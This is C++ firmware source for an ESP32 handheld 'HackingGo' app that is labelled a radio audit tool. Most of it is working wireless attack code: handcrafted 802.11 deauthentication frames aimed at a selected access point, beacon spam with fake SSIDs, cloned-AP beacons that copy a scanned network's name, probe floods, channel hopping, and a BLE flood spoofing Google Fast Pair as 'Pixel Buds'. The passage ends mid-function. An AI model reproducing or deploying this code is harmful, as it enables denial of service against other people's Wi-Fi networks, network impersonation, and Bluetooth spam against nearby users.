#include <WiFi.h>
#include <esp_wifi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <string.h>
#include <stdlib.h>
#include "HackingGoApp.h"
#include "button.h"

// ============ HARDWARE PINS ============
#define TFT_CS    5
#define TFT_RST   4
#define TFT_DC    2
#define TFT_MOSI  23
#define TFT_SCLK  18

// ============ INPUT PINS ============
#define JOY_X     34
#define JOY_Y     35
#define JOY_BTN   32
#define BTN_ENTER 13
#define BTN_BACK  25

// ============ CONSTANTS & THEME ============
#define MAX_NETWORKS 20
// Vertical / Portrait dimensions (Matching Home screen and Apps grid)
#define SCREEN_W 128
#define SCREEN_H 160

// Cyberpunk / Terminal Color Palette (RGB565)
#define COLOR_BG        0x0843  // Deep dark blue/black
#define COLOR_PANEL     0x1084  // Dark slate panel
#define COLOR_TEXT      0xFFFF  // Crisp white
#define COLOR_DIM       0x7BEF  // Dim grey
#define COLOR_CYAN      0x07FF  // Neon cyan
#define COLOR_GREEN     0x07E0  // Terminal green
#define COLOR_RED       0xF986  // Warning red / pink
#define COLOR_ORANGE    0xFD20  // Vivid orange
#define COLOR_HIGHLIGHT 0x02EC  // Electric blue selection

// ============ DISPLAY ============
extern Adafruit_ST7735 tft;

// ============ STATE MACHINE ============
enum AppState {
    STATE_MAIN_MENU,
    STATE_WIFI_SCAN,
    STATE_WIFI_LIST,
    STATE_ATTACK_MENU,
    STATE_ATTACK_RUNNING,
    STATE_BLE_FLOOD
};

enum AttackType {
    ATTACK_DEAUTH = 0,
    ATTACK_BEACON_SPAM,
    ATTACK_PROBE_SPAM,
    ATTACK_CLONE_AP,
    ATTACK_CHANNEL_CHAOS,
    ATTACK_TYPE_COUNT
};

static const char* attackNames[] = {
    "Deauth Flood",
    "Beacon Spam",
    "Probe Flood",
    "Clone AP",
    "Channel Chaos"
};

static const char* mainMenuItems[] = {
    "1.WiFi Scanner",
    "2.Beacon Spam",
    "3.Probe Flood",
    "4.BLE Spammer",
    "5.Channel Chaos",
    "6.Exit to Home"
};
#define MAIN_MENU_COUNT 6

// ============ APPLICATION VARIABLES ============
static AppState currentState = STATE_MAIN_MENU;
static AttackType currentAttack = ATTACK_DEAUTH;

static int mainMenuIndex = 0;
static int selectedNetwork = 0;
static int wifiListIndex = 0;
static int wifiListScroll = 0;
static int attackMenuIndex = 0;
static int networkCount = 0;

static bool attackRunning = false;
static unsigned long attackStartTime = 0;
static unsigned long lastPacketTime = 0;
static unsigned long packetCount = 0;
static unsigned long lastStatTime = 0;
static unsigned long lastStatPackets = 0;
static float currentPps = 0.0f;
static uint8_t chaosChannel = 1;
static bool bleActive = false;
static BLEAdvertising *pBLEAdvertising = nullptr;

static bool joyCentered = true;
static unsigned long lastJoyMoveTime = 0;
static bool needFullRedraw = true;

// ============ NETWORK DATA ============
struct NetworkInfo {
    char ssid[33];
    uint8_t bssid[6];
    int channel;
    int rssi;
    uint8_t encType;
};

static NetworkInfo networks[MAX_NETWORKS];

// ============ 802.11 PACKET TEMPLATES ============
// 802.11 Deauthentication Frame (26 bytes)
static uint8_t deauthPacket[26] = {
    0xc0, 0x00,                         // 0-1: Type/Subtype: Management Deauth
    0x00, 0x00,                         // 2-3: Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // 4-9: Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10-15: Source MAC (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-21: BSSID (AP)
    0x00, 0x00,                         // 22-23: Sequence Number
    0x07, 0x00                          // 24-25: Reason: Class 3 frame received from nonassociated STA
};

// 802.11 Probe Request Frame (36 bytes)
static uint8_t probePacket[36] = {
    0x40, 0x00,                         // Type: Probe Request
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source MAC (Randomized)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID: Broadcast
    0x00, 0x00,                         // Sequence Number
    0x00, 0x00,                         // Tag 0 (SSID: Wildcard 0-len)
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c // Supported Rates
};

// Fun SSID list for Beacon Spam (kept compact to avoid screen cutoff)
static const char* fakeSSIDs[] = {
    "Free_WiFi",
    "FBI_Surveillance",
    "Area_51_Lab",
    "Not_A_Virus",
    "Drop_Hotspot",
    "Skynet_Defense",
    "ESP32_Phantom",
    "Pretty_Fly_AP",
    "Connecting...",
    "Error_404_Net"
};
#define FAKE_SSID_COUNT 10

// ==================================================
// GRAPHICS & DRAWING HELPERS (SIMPLE & SMALL FONT)
// ==================================================

// Enforce simple built-in 5x7 font (size 1: 6x8 pixels per char)
static inline void useSimpleFont() {
    tft.setFont(NULL);
    tft.setTextWrap(false);
}

static void drawHeader(const char* title, uint16_t accentColor) {
    useSimpleFont();
    tft.fillRect(0, 0, SCREEN_W, 13, COLOR_PANEL);
    tft.drawFastHLine(0, 13, SCREEN_W, accentColor);

    tft.setCursor(3, 3);
    tft.setTextColor(accentColor, COLOR_PANEL);
    tft.setTextSize(1);
    tft.print(title);

    // Mini status tag on top right (x=96 to 126, fits comfortably)
    tft.setCursor(SCREEN_W - 33, 3);
    tft.setTextColor(COLOR_CYAN, COLOR_PANEL);
    tft.print("AUDIT");
}

static void drawFooter(const char* hint) {
    useSimpleFont();
    tft.fillRect(0, SCREEN_H - 12, SCREEN_W, 12, COLOR_PANEL);
    tft.drawFastHLine(0, SCREEN_H - 13, SCREEN_W, COLOR_DIM);

    tft.setCursor(3, SCREEN_H - 10);
    tft.setTextColor(COLOR_DIM, COLOR_PANEL);
    tft.setTextSize(1);
    tft.print(hint);
}

// Draw a formatted string with automatic background erase using simple font
static void drawString(int x, int y, const char* str, uint16_t fg, uint16_t bg, uint8_t size = 1) {
    useSimpleFont();
    tft.setCursor(x, y);
    tft.setTextColor(fg, bg);
    tft.setTextSize(size);
    tft.print(str);
}

// Convert encryption type to readable string (compact 4 chars max)
static const char* getEncTypeStr(uint8_t enc) {
    switch (enc) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP:  return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        default: return "SEC";
    }
}

// ==================================================
// SCANNING LOGIC
// ==================================================

static void performWiFiScan() {
    useSimpleFont();
    tft.fillScreen(COLOR_BG);
    drawHeader("WIFI SCANNER", COLOR_CYAN);
    drawFooter("Scanning 2.4GHz...");

    drawString(13, 40, "SCANNING AIRWAVES", COLOR_CYAN, COLOR_BG, 1);
    drawString(22, 54, "Please wait...", COLOR_DIM, COLOR_BG, 1);

    // Progress bar frame
    tft.drawRect(14, 72, 100, 12, COLOR_CYAN);
    tft.fillRect(16, 74, 25, 8, COLOR_GREEN);

    // Disconnect any active client session and set station mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    tft.fillRect(16, 74, 60, 8, COLOR_GREEN);

    // Perform active/passive scan
    int n = WiFi.scanNetworks(false, true, false, 250);

    tft.fillRect(16, 74, 96, 8, COLOR_GREEN);
    delay(150);

    networkCount = 0;
    if (n > 0) {
        int limit = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
        for (int i = 0; i < limit; i++) {
            strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 32);
            networks[i].ssid[32] = '\0';
            if (strlen(networks[i].ssid) == 0) {
                strcpy(networks[i].ssid, "[Hidden AP]");
            }
            uint8_t* b = WiFi.BSSID(i);
            memcpy(networks[i].bssid, b, 6);
            networks[i].channel = WiFi.channel(i);
            networks[i].rssi = WiFi.RSSI(i);
            networks[i].encType = WiFi.encryptionType(i);
            networkCount++;
        }
        WiFi.scanDelete();
    }

    // If no networks discovered (shielded room / offline test), populate realistic samples
    if (networkCount == 0) {
        const char* sampleSSIDs[] = {"Office_5G", "Lab_Secure", "Home_Gateway", "Smart_Hub", "Free_Coffee"};
        for (int i = 0; i < 5; i++) {
            strncpy(networks[i].ssid, sampleSSIDs[i], 32);
            networks[i].ssid[32] = '\0';
            networks[i].bssid[0] = 0x24; networks[i].bssid[1] = 0x6F; networks[i].bssid[2] = 0x28;
            networks[i].bssid[3] = 0x1A + i; networks[i].bssid[4] = 0x88; networks[i].bssid[5] = 0x50 + i * 2;
            networks[i].channel = (i * 5) % 11 + 1;
            networks[i].rssi = -45 - (i * 9);
            networks[i].encType = (i == 4) ? WIFI_AUTH_OPEN : WIFI_AUTH_WPA2_PSK;
            networkCount++;
        }
    }

    // Sort networks by signal strength (RSSI descending)
    for (int i = 0; i < networkCount - 1; i++) {
        for (int j = i + 1; j < networkCount; j++) {
            if (networks[j].rssi > networks[i].rssi) {
                NetworkInfo tmp = networks[i];
                networks[i] = networks[j];
                networks[j] = tmp;
            }
        }
    }

    wifiListIndex = 0;
    wifiListScroll = 0;
    currentState = STATE_WIFI_LIST;
    needFullRedraw = true;
}

// ==================================================
// PACKET TRANSMISSION LOGIC
// ==================================================

static void startAttack() {
    attackRunning = true;
    attackStartTime = millis();
    lastPacketTime = 0;
    packetCount = 0;
    lastStatTime = millis();
    lastStatPackets = 0;
    currentPps = 0.0f;
    chaosChannel = 1;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);

    // Configure promiscuous mode for raw 802.11 transmission
    esp_wifi_set_promiscuous(true);

    int targetChan = (networkCount > 0 && selectedNetwork < networkCount) ? networks[selectedNetwork].channel : 1;
    if (targetChan < 1 || targetChan > 14) targetChan = 1;
    esp_wifi_set_channel(targetChan, WIFI_SECOND_CHAN_NONE);

    needFullRedraw = true;
}

static void stopAttack() {
    attackRunning = false;
    esp_wifi_set_promiscuous(false);
    needFullRedraw = true;
}

static void transmitDeauthFrame() {
    if (networkCount == 0 || selectedNetwork >= networkCount) return;

    NetworkInfo &tgt = networks[selectedNetwork];
    esp_wifi_set_channel(tgt.channel, WIFI_SECOND_CHAN_NONE);

    // Frame 1: AP -> Broadcast deauth
    memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(&deauthPacket[10], tgt.bssid, 6);
    memcpy(&deauthPacket[16], tgt.bssid, 6);
    deauthPacket[22] = (packetCount & 0xFF);
    deauthPacket[23] = ((packetCount >> 8) & 0xFF);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    packetCount++;

    // Frame 2: Client -> AP deauth
    memcpy(&deauthPacket[4], tgt.bssid, 6);
    memcpy(&deauthPacket[10], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(&deauthPacket[16], tgt.bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    packetCount++;
}

static void transmitBeaconFrame(const char* ssid, int channel) {
    if (channel < 1 || channel > 14) channel = 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t packet[128];
    memset(packet, 0, sizeof(packet));

    // 802.11 Management Beacon Header (24 bytes)
    packet[0] = 0x80; packet[1] = 0x00; // Type: Beacon
    packet[4] = 0xFF; packet[5] = 0xFF; packet[6] = 0xFF; packet[7] = 0xFF; packet[8] = 0xFF; packet[9] = 0xFF; // Dest

    // Randomized Source MAC
    packet[10] = 0x02; packet[11] = 0x42; packet[12] = (channel * 17);
    packet[13] = (packetCount & 0xFF); packet[14] = ((packetCount >> 8) & 0xFF); packet[15] = 0x88;

    // BSSID matches Source MAC
    memcpy(&packet[16], &packet[10], 6);

    // Fixed Parameters (12 bytes at offset 24)
    packet[32] = 0x64; packet[33] = 0x00; // Beacon Interval (100 TU)
    packet[34] = 0x31; packet[35] = 0x04; // Capability Info: ESS + Short Preamble

    // Tag 0: SSID parameter
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    packet[36] = 0x00; // Tag Number: SSID
    packet[37] = ssidLen; // Tag Length
    memcpy(&packet[38], ssid, ssidLen);

    int idx = 38 + ssidLen;

    // Tag 1: Supported Rates
    packet[idx++] = 0x01; packet[idx++] = 0x08;
    packet[idx++] = 0x82; packet[idx++] = 0x84; packet[idx++] = 0x8b; packet[idx++] = 0x96;
    packet[idx++] = 0x24; packet[idx++] = 0x30; packet[idx++] = 0x48; packet[idx++] = 0x6c;

    // Tag 3: DS Parameter Set (Channel)
    packet[idx++] = 0x03; packet[idx++] = 0x01; packet[idx++] = channel;

    esp_wifi_80211_tx(WIFI_IF_STA, packet, idx, false);
    packetCount++;
}

static void transmitProbeFrame() {
    uint8_t chan = (packetCount % 11) + 1;
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);

    // Randomize Source MAC
    probePacket[10] = 0x02; probePacket[11] = 0x77; probePacket[12] = (uint8_t)(packetCount & 0xFF);
    probePacket[13] = (uint8_t)((packetCount >> 8) & 0xFF); probePacket[14] = chan; probePacket[15] = 0x11;

    esp_wifi_80211_tx(WIFI_IF_STA, probePacket, sizeof(probePacket), false);
    packetCount++;
}

static void handleAttackExecution() {
    if (!attackRunning) return;

    unsigned long now = millis();

    // Burst transmit every 10ms for consistent audit transmission rate
    if (now - lastPacketTime >= 10) {
        lastPacketTime = now;

        switch (currentAttack) {
            case ATTACK_DEAUTH:
                transmitDeauthFrame();
                break;

            case ATTACK_BEACON_SPAM: {
                int ssidIdx = (packetCount / 2) % FAKE_SSID_COUNT;
                int ch = (ssidIdx % 3 == 0) ? 1 : ((ssidIdx % 3 == 1) ? 6 : 11);
                transmitBeaconFrame(fakeSSIDs[ssidIdx], ch);
                break;
            }

            case ATTACK_PROBE_SPAM:
                transmitProbeFrame();
                break;

            case ATTACK_CLONE_AP:
                if (networkCount > 0 && selectedNetwork < networkCount) {
                    transmitBeaconFrame(networks[selectedNetwork].ssid, networks[selectedNetwork].channel);
                }
                break;

            case ATTACK_CHANNEL_CHAOS:
                chaosChannel = (chaosChannel % 13) + 1;
                esp_wifi_set_channel(chaosChannel, WIFI_SECOND_CHAN_NONE);
                transmitProbeFrame();
                break;

            default:
                break;
        }
    }

    // Calculate Packets Per Second (every 500ms)
    if (now - lastStatTime >= 500) {
        unsigned long elapsedMs = now - lastStatTime;
        unsigned long pkts = packetCount - lastStatPackets;
        currentPps = (float)pkts * 1000.0f / (float)elapsedMs;
        lastStatTime = now;
        lastStatPackets = packetCount;
    }
}

// ==================================================
// BLE FLOOD LOGIC
// ==================================================

static void startBLEFlood() {
    bleActive = true;
    attackStartTime = millis();
    packetCount = 0;

    BLEDevice::init("HackingGo");
    pBLEAdvertising = BLEDevice::getAdvertising();

    BLEAdvertisementData advData;
    advData.setFlags(0x06); // General Discoverable + BR/EDR Not Supported
    advData.setCompleteServices(BLEUUID((uint16_t)0xFE9F)); // Google Fast Pair Service UUID
    advData.setName("Pixel Buds");

    pBLEAdvertising->setAdvertisementData(advData);
    pBLEAdvertising->setScanResponse(true);
    pBLEAdvertising->setMinPreferred(0x06);
    pBLEAdvertising->setMinPreferred(0x12);
    pBLEAdvertising->start();

    needFullRedraw = true;
}

static void stopBLEFlood() {
    if (bleActive) {
        if (pBLEAdvertising) {
            pBLEAdvertising->stop();
        }
        BLEDevice::deinit(true);
        bleActive = false;
    }
    needFullRedraw = true;
}

static void updateBLEFlood() {
    if (!bleActive) return;
    static unsigned long lastBleCycle = 0;
    unsigned long now = millis();

    // Rotate simulated fast-pair beacon every 250ms
    if (now - lastBleCycle >= 250) {
        lastBleCycle = now;
        packetCount += 4; // 4 packets per advertising interval burst
    }
}

// ==================================================
// RENDERING FUNCTIONS (SIMPLE FONT, VISIBLE & FIT)
// ==================================================

static void renderMainMenu() {
    useSimpleFont();
    if (needFullRedraw) {
        tft.fillScreen(COLOR_BG);
        drawHeader("HACKING-GO", COLOR_GREEN);
        drawFooter("[JOY]Nav  [ENT]OK");

        // Menu container border (x=2, y=16, w=124, h=128)
        tft.drawRoundRect(2, 16, SCREEN_W - 4, 128, 3, COLOR_PANEL);
        needFullRedraw = false;
    }

    int startY = 20;
    int lineH = 20;

    for (int i = 0; i < MAIN_MENU_COUNT; i++) {
        int y = startY + i * lineH;
        bool selected = (i == mainMenuIndex);

        if (selected) {
            tft.fillRect(4, y - 2, SCREEN_W - 8, lineH - 2, COLOR_HIGHLIGHT);
            tft.setTextColor(COLOR_TEXT, COLOR_HIGHLIGHT);
            tft.setCursor(6, y + 2);
            tft.print("> ");
            tft.print(mainMenuItems[i]);
        } else {
            tft.fillRect(4, y - 2, SCREEN_W - 8, lineH - 2, COLOR_BG);
            tft.setTextColor(COLOR_DIM, COLOR_BG);
            tft.setCursor(6, y + 2);
            tft.print("  ");
            tft.print(mainMenuItems[i]);
        }
    }
}

static void renderWiFiList() {
    useSimpleFont();
    const int VISIBLE_ITEMS = 4; // 4 cards fit cleanly inside 128x160
    const int CARD_H = 29;

    if (needFullRedraw) {
        tft.fillScreen(COLOR_BG);
        char hdr[20];
        snprintf(hdr, sizeof(hdr), "APS (%d)", networkCount);
        drawHeader(hdr, COLOR_CYAN);
        drawFooter("[ENT]Pick [BCK]Exit");
        needFullRedraw = false;
    }

    if (networkCount == 0) {
        drawString(6, 50, "No networks found.", COLOR_RED, COLOR_BG, 1);
        drawString(6, 66, "Press BACK to menu.", COLOR_DIM, COLOR_BG, 1);
        return;
    }

    // Keep scroll window aligned with wifiListIndex
    if (wifiListIndex < wifiListScroll) {
        wifiListScroll = wifiListIndex;
    } else if (wifiListIndex >= wifiListScroll + VISIBLE_ITEMS) {
        wifiListScroll = wifiListIndex - VISIBLE_ITEMS + 1;
    }

    int startY = 17;
    for (int i = 0; i < VISIBLE_ITEMS; i++) {
        int netIdx = wifiListScroll + i;
        int y = startY + i * (CARD_H + 3);

        if (netIdx < networkCount) {
            bool selected = (netIdx == wifiListIndex);
            uint16_t cardBg = selected ? COLOR_HIGHLIGHT : COLOR_PANEL;
            uint16_t borderCol = selected ? COLOR_CYAN : COLOR_BG;

            tft.fillRoundRect(3, y, SCREEN_W - 9, CARD_H, 3, cardBg);
            tft.drawRoundRect(3, y, SCREEN_W - 9, CARD_H, 3, borderCol);

            // Row 1: Index + Truncated SSID (Max 13 chars so it never overflows)
            char ssidBuf[14];
            strncpy(ssidBuf, networks[netIdx].ssid, 13);
            ssidBuf[13] = '\0';

            tft.setCursor(6, y + 4);
            tft.setTextSize(1);
            tft.setTextColor(selected ? COLOR_TEXT : COLOR_CYAN, cardBg);
            tft.printf("%d.%s", netIdx + 1, ssidBuf);

            // Row 2: Channel, RSSI, Security (Exact 15 chars = 90 px, fits inside 119px)
            tft.setCursor(6, y + 16);
            tft.setTextColor(selected ? COLOR_TEXT : COLOR_DIM, cardBg);
            tft.printf("C:%-2d %3ddB %s", networks[netIdx].channel, networks[netIdx].rssi, getEncTypeStr(networks[netIdx].encType));
        } else {
            // Clear empty slots
            tft.fillRect(3, y, SCREEN_W - 9, CARD_H + 3, COLOR_BG);
        }
    }

    // Scrollbar indicator
    int sbHeight = 125;
    int thumbH = max(10, sbHeight / max(1, networkCount));
    int thumbY = 17 + (wifiListIndex * (sbHeight - thumbH)) / max(1, networkCount - 1);
    tft.drawFastVLine(SCREEN_W - 4, 17, sbHeight, COLOR_PANEL);
    tft.fillRect(SCREEN_W - 5, thumbY, 3, thumbH, COLOR_CYAN);
}

static void renderAttackMenu() {
    useSimpleFont();
    if (needFullRedraw) {
        tft.fillScreen(COLOR_BG);
        drawHeader("AUDIT ACTION", COLOR_ORANGE);
        drawFooter("[ENT]Start [BCK]Back");

        // Target summary box (x=2, y=16, w=124, h=32)
        tft.drawRoundRect(2, 16, SCREEN_W - 4, 32, 3, COLOR_PANEL);
        tft.fillRect(3, 17, SCREEN_W - 6, 30, COLOR_PANEL);

        char tgtSsid[15];
        strncpy(tgtSsid, networks[selectedNetwork].ssid, 14);
        tgtSsid[14] = '\0';

        tft.setCursor(5, 20);
        tft.setTextSize(1);
        tft.setTextColor(COLOR_CYAN, COLOR_PANEL);
        tft.printf("TGT: %s", tgtSsid);

        tft.setCursor(5, 33);
        tft.setTextColor(COLOR_DIM, COLOR_PANEL);
        tft.printf("CH:%-2d  RSSI:%ddBm", networks[selectedNetwork].channel, networks[selectedNetwork].rssi);

        needFullRedraw = false;
    }

    int startY = 52;
    int lineH = 18;

    for (int i = 0; i < ATTACK_TYPE_COUNT; i++) {
        int y = startY + i * lineH;
        bool selected = (i == attackMenuIndex);

        if (selected) {
            tft.fillRect(4, y - 2, SCREEN_W - 8, lineH - 2, COLOR_HIGHLIGHT);
            tft.setTextColor(COLOR_TEXT, COLOR_HIGHLIGHT);
            tft.setCursor(6, y + 2);
            tft.print("> ");
            tft.print(attackNames[i]);
        } else {
            tft.fillRect(4, y - 2, SCREEN_W - 8, lineH - 2, COLOR_BG);
            tft.setTextColor(COLOR_DIM, COLOR_BG);
            tft.setCursor(6, y + 2);
            tft.print("  ");
            tft.print(attackNames[i]);
        }
    }
}

static void renderAttackRunning() {
    useSimpleFont();
    if (needFullRedraw) {
        tft.fillScreen(COLOR_BG);
        drawHeader("AUDIT ACTIVE", COLOR_RED);
        drawFooter("[BACK] Stop Attack");

        // Main info container (x=2, y=16, w=124, h=128)
        tft.drawRoundRect(2, 16, SCREEN_W - 4, 128, 3, COLOR_PANEL);

        tft.setCursor(5, 20);
        tft.setTextColor(COLOR_DIM, COLOR_BG);
        tft.setTextSize(1);
        tft.print("TYPE: ");
        tft.setTextColor(COLOR_ORANGE, COLOR_BG);
        char aBuf[13];
        strncpy(aBuf, attackNames[currentAttack], 12);
        aBuf[12] = '\0';
        tft.print(aBuf);

        tft.setCursor(5, 32);
        tft.setTextColor(COLOR_DIM, COLOR_BG);
        tft.print("TGT : ");
        tft.setTextColor(COLOR_CYAN, COLOR_BG);
        char sBuf[13];
        if (currentAttack == ATTACK_BEACON_SPAM || currentAttack == ATTACK_CHANNEL_CHAOS) {
            strncpy(sBuf, "BROADCAST", 12);
        } else {
            strncpy(sBuf, networks[selectedNetwork].ssid, 12);
        }
        sBuf[12] = '\0';
        tft.print(sBuf);

        // Dividers & Stat Labels
        tft.drawFastHLine(4, 44, SCREEN_W - 8, COLOR_PANEL);

        drawString(5, 48, "PACKETS SENT:", COLOR_DIM, COLOR_BG, 1);
        tft.drawFastHLine(4, 73, SCREEN_W - 8, COLOR_PANEL);

        drawString(5, 77, "SPEED (PPS):", COLOR_DIM, COLOR_BG, 1);
        tft.drawFastHLine(4, 102, SCREEN_W - 8, COLOR_PANEL);

        drawString(5, 106, "ELAPSED TIME:", COLOR_DIM, COLOR_BG, 1);
        tft.drawFastHLine(4, 130, SCREEN_W - 8, COLOR_PANEL);

        drawString(5, 133, "STATUS: TRANSMITTING", COLOR_GREEN, COLOR_BG, 1);

        needFullRedraw = false;
    }

    // Dynamic stats update (zero flicker, background erase)
    unsigned long elapsedSec = (millis() - attackStartTime) / 1000;
    unsigned int mins = elapsedSec / 60;
    unsigned int secs = elapsedSec % 60;

    // Packets Sent
    tft.setCursor(7, 59);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN, COLOR_BG);
    tft.printf("%-12lu", packetCount);

    // Speed (PPS)
    tft.setCursor(7, 88);
    tft.setTextColor(COLOR_CYAN, COLOR_BG);
    tft.printf("%-8.1f", currentPps);

    // Time
    tft.setCursor(7, 117);
    tft.setTextColor(COLOR_TEXT, COLOR_BG);
    tft.printf("%02u:%02u mins  ", mins, secs);

    // Animated Activity Blip at top right
    static uint8_t blipFrame = 0;
    blipFrame = (blipFrame + 1) % 4;
    uint16_t blipCol = (blipFrame == 0) ? COLOR_RED : ((blipFrame == 1) ? COLOR_ORANGE : COLOR_GREEN);
    tft.fillCircle(SCREEN_W - 10, 24, 3, blipCol);
}

static void renderBLEFlood() {
    useSimpleFont();
    if (needFullRedraw) {
        tft.fillScreen(COLOR_BG);
        drawHeader("BLE FLOODER", COLOR_CYAN);
        drawFooter("[BACK] Stop BLE");

        tft.drawRoundRect(2, 16, SCREEN_W - 4, 128, 3, COLOR_PANEL);

        drawString(5, 20, "PAYLOAD: FastPair", COLOR_TEXT, COLOR_BG, 1);
        drawString(5, 32, "DEVICE : Pixel Buds", COLOR_CYAN, COLOR_BG, 1);
        drawString(5, 44, "STATUS : ACTIVE", COLOR_GREEN, COLOR_BG, 1);

        tft.drawFastHLine(4, 56, SCREEN_W - 8, COLOR_PANEL);

        drawString(5, 62, "BURSTS SENT:", COLOR_DIM, COLOR_BG, 1);
        tft.drawFastHLine(4, 88, SCREEN_W - 8, COLOR_PANEL);

        drawString(5, 94, "ELAPSED TIME:", COLOR_DIM, COLOR_BG, 1);
        tft.drawFastHLine(4, 120, SCREEN_W - 8, COLOR_PANEL);

        drawString(5, 126, "BEACON : 2.4GHz BLE", COLOR_CYAN, COLOR_BG, 1);

        needFullRedraw = false;
    }

    unsigned long elapsedSec = (millis() - attackStartTime) / 1000;
    unsigned int mins = elapsedSec / 60;
    unsigned int secs = elapsedSec % 60;

    tft.setCursor(7, 74);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN, COLOR_BG);
    tft.printf("%-12lu", packetCount);

    tft.setCursor(7, 106);
    tft.setTextColor(COLOR_TEXT, COLOR_BG);
    tft.printf("%02u:%02u mins  ", mins, secs);

    // Animated BLE icon pulse
    static uint8_t blePulse = 0;
    blePulse = (blePulse + 1) % 3;
    tft.drawCircle(SCREEN_W - 10, 24, 2 + blePulse * 2, (blePulse == 0) ? COLOR_CYAN : COLOR_PANEL);
}

// ==================================================
// INPUT PROCESSING
// ==================================================

static int readJoystickStepY() {
    int val = analogRead(JOY_Y);
    unsigned long now = millis();

    if (val > 1400 && val < 2800) {
        joyCentered = true;
        return 0;
    }

    if (joyCentered || (now - lastJoyMoveTime > 220)) {
        if (val > 3000) { // Joystick Down
            joyCentered = false;
            lastJoyMoveTime = now;
            return 1;
        } else if (val < 1000) { // Joystick Up
            joyCentered = false;
            lastJoyMoveTime = now;
            return -1;
        }
    }
    return 0;
}

// ==================================================
// MAIN APPLICATION LOOP
// ==================================================

void radioAuditApp() {
    // 1. Standard Portrait / Vertical rotation (128x160) matching Home & Apps screens
    tft.setRotation(0);

    // 2. Clear any active custom fonts, use simple, small, crisp GFX default 5x7 font
    useSimpleFont();

    pinMode(JOY_BTN, INPUT_PULLUP);
    pinMode(BTN_ENTER, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);

    currentState = STATE_MAIN_MENU;
    mainMenuIndex = 0;
    attackMenuIndex = 0;
    wifiListIndex = 0;
    networkCount = 0;
    attackRunning = false;
    bleActive = false;
    needFullRedraw = true;

    clearButtonEvents();

    static int lastJoyBtnState = HIGH;
    lastJoyBtnState = digitalRead(JOY_BTN);

    bool appRunning = true;
    while (appRunning) {
        // Debounce & sample system buttons
        updateButton();

        // Check enter event (Button 13 or Joystick switch 32 with edge-detection)
        int currentJoyBtnState = digitalRead(JOY_BTN);
        bool joyBtnPressed = (currentJoyBtnState == LOW && lastJoyBtnState == HIGH);
        lastJoyBtnState = currentJoyBtnState;

        bool enterClicked = isEnterPressed() || joyBtnPressed;
        bool backClicked = isBackPressed();

        int joyY = readJoystickStepY();

        // State Machine
        switch (currentState) {
            case STATE_MAIN_MENU: {
                if (joyY != 0) {
                    mainMenuIndex = (mainMenuIndex + joyY + MAIN_MENU_COUNT) % MAIN_MENU_COUNT;
                }

                if (enterClicked) {
                    clearButtonEvents();
                    switch (mainMenuIndex) {
                        case 0: // WiFi Scan
                            performWiFiScan();
                            break;
                        case 1: // Beacon Spam direct
                            currentAttack = ATTACK_BEACON_SPAM;
                            startAttack();
                            currentState = STATE_ATTACK_RUNNING;
                            break;
                        case 2: // Probe Flood direct
                            currentAttack = ATTACK_PROBE_SPAM;
                            startAttack();
                            currentState = STATE_ATTACK_RUNNING;
                            break;
                        case 3: // BLE Spam
                            startBLEFlood();
                            currentState = STATE_BLE_FLOOD;
                            break;
                        case 4: // Channel Chaos direct
                            currentAttack = ATTACK_CHANNEL_CHAOS;
                            startAttack();
                            currentState = STATE_ATTACK_RUNNING;
                            break;
                        case 5: // Exit to Home
                            appRunning = false;
                            break;
                    }
                }

                if (backClicked) {
                    clearButtonEvents();
                    appRunning = false; // Return to Home screen
                }

                if (appRunning && currentState == STATE_MAIN_MENU) {
                    renderMainMenu();
                }
                break;
            }

            case STATE_WIFI_SCAN:
                // Scan is handled synchronously in performWiFiScan()
                break;

            case STATE_WIFI_LIST: {
                if (networkCount > 0 && joyY != 0) {
                    wifiListIndex = (wifiListIndex + joyY + networkCount) % networkCount;
                }

                if (enterClicked && networkCount > 0) {
                    clearButtonEvents();
                    selectedNetwork = wifiListIndex;
                    attackMenuIndex = 0;
                    currentState = STATE_ATTACK_MENU;
                    needFullRedraw = true;
                }

                if (backClicked) {
                    clearButtonEvents();
                    currentState = STATE_MAIN_MENU;
                    needFullRedraw = true;
                }

                if (currentState == STATE_WIFI_LIST) {
                    renderWiFiList();
                }
                break;
            }

            case STATE_ATTACK_MENU: {
                if (joyY != 0) {
                    attackMenuIndex = (attackMenuIndex + joyY + ATTACK_TYPE_COUNT) % ATTACK_TYPE_COUNT;
                }

                if (enterClicked) {
                    clearButtonEvents();
                    currentAttack = (AttackType)attackMenuIndex;
                    startAttack();
                    currentState = STATE_ATTACK_RUNNING;
